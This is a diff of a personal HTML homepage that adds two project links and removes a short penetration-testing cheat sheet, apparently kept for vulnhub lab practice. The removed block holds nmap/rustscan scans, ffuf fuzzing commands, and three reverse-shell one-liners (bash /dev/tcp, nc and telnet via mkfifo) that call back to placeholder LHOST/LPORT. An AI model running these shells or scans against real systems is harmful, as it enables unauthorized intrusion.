@@ -1,4 +1,8 @@
 <title>peter melnicek</title>
+
+<a href="https://melnicek.github.io/string-id/">melnicek/string-id</a>
+<a href="https://melnicek.github.io/fyoutube/">melnicek/fyoutube</a>
+
 <style>
     a:link,
     a:visited {
@@ -25,31 +29,6 @@
         color: #eee
     }
 </style>
-
-<pre>
-sudo rustscan -a $IP --ulimit 8192 -- -sC -sV -o nmap
-sudo nmap -sC -sV -v -p- -o nmap $IP
-ffuf -w /usr/share/wordlists/directory-list-2.3-small.txt:FUZZ -u http://RHOST:RPORT/FUZZ -recursion -recursion-depth 2 -e '.php,.txt,.html' -t 128 -v
-ffuf -w /usr/share/wordlists/directory-list-2.3-big.txt:FUZZ -u http://RHOST:RPORT/FUZZ -recursion -recursion-depth 2 -t 128 -v
-ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://RHOST:RPORT/ -H 'Host: FUZZ.DOMAIN' -t 128 -v
-
----
-
-bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'
-rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/y
-rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/sh -i 2>&1|telnet LHOST LPORT >/tmp/y
-
-SHELL=/bin/bash script -q /dev/null
-[Ctrl + Z]
-stty raw -echo
-fg
-reset
-xterm
-
----
-
-document.body.style['transform'] = 'rotate(180deg)'
-</pre>
 
 <!--
 https://vulnhub.com/ machines
